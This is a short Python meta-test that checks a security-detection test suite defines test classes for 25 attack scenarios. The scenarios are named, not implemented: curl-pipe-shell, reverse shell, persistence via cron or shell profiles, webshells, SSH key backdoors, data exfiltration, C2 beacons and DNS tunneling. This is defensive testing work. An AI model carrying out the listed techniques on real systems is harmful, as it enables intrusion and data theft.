    """Meta-test: verify the test suite covers all 25 documented scenarios."""

    EXPECTED_SCENARIOS = [
        "TestScenario01_BinaryFromTemp",
        "TestScenario02_CurlPipeShell",
        "TestScenario03_PythonReverseShell",
        "TestScenario04_LaunchAgentPersistence",
        "TestScenario05_ShellProfileHijack",
        "TestScenario06_CronPersistence",
        "TestScenario07_WebshellDrop",
        "TestScenario08_WorldWritable",
        "TestScenario09_NXDomainBurst",
        "TestScenario10_DGADomains",
        "TestScenario11_USBStorage",
        "TestScenario12_SudoElevation",
        "TestScenario13_SUIDbitChange",
        "TestScenario14_ConfigBackdoor",
        "TestScenario15_SSHKeyBackdoor",
        "TestScenario16_HiddenFile",
        "TestScenario17_PortScan",
        "TestScenario18_DataExfil",
        "TestScenario19_C2Beacon",
        "TestScenario20_SuspiciousTunnel",
        "TestScenario21_SuspiciousTLD",
        "TestScenario22_DNSTunneling",
        "TestScenario23_SSHBruteForce",
        "TestScenario24_ExecveFromTmp",
        "TestScenario25_SyscallFlood",
    ]

    def test_all_25_scenarios_defined(self):
        """All 25 attack surface scenarios have test classes."""
        import sys

        module = sys.modules[__name__]
        for name in self.EXPECTED_SCENARIOS:
            assert hasattr(module, name), f"Missing test class: {name}"
